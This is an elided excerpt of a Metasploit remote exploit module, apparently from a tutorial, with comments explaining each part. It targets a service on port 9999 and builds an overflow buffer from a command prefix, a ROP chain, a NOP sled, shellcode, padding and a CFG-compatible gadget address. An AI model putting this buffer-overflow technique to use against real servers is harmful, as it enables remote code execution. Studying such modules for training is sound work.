...
class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module inheriting from the remote exploit class
    ...
    def initialize(info = {})	# i.e. constructor, setting the initial values
      super(update_info(info,
        ...
        register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
            ...
            OptInt.new('CFG_ROP_GADGET', [true, 'Integer set for ROP Gadget Return Address. This MUST be from a CFG enabled module, must be HEX.', 0x0015499A]),
            Opt::RPORT(9999),
    ...
    def exploit	# Actual exploit
      ...
      outbound = 'FUNCC /.' + rop_chain + "\x90" * 8 + shellcode + "A"*(datastore['RETOFFSET'] - (rop_chain.length + 8 + shellcode.length())) + [datastore['CFG_ROP_GADGET']].pack('V') # Create the malicious string that will be sent to the target
